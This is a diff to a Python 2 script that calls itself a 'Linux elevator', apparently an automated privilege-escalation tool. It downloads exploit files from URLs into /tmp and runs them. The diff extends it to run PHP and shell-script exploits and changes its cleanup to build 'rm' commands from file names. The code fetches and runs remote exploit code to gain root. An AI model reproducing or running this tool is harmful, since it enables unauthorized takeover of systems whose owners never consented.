@@ -36,11 +36,15 @@ def process_exploit(exploit, url_opener):
             run_exploit('', exploit_url, filename, "python %s" % filename)
         elif filename.endswith('.pl'):
             run_exploit('', exploit_url, filename, "perl %s" % filename)
+        elif filename.endswith('.php'):
+            run_exploit('', exploit_url, filename, "php %s" % filename)
+        elif filename.endswith('.sh'):
+            run_exploit('', exploit_url, filename, "sh %s" % filename)
 
     except Exception:
         pass
     for file in files_to_delete:
-        run_command('rm %s' % file)
+        os.popen3('rm %s' % file, 'r')
 
 
 def run_exploit(compile_cmd, exploit_url, filename, exploit_cmd):
@@ -71,6 +75,8 @@ def find_keywords(uname_out):
 
 
 def run_escalator(ur_lopener=urllib.URLopener()):
+    global END
+    END = False
     print '\n#### Linux elevator v%s ####\n' % VERSION
     os.chdir('/tmp')
     if not os.path.exists(DB):
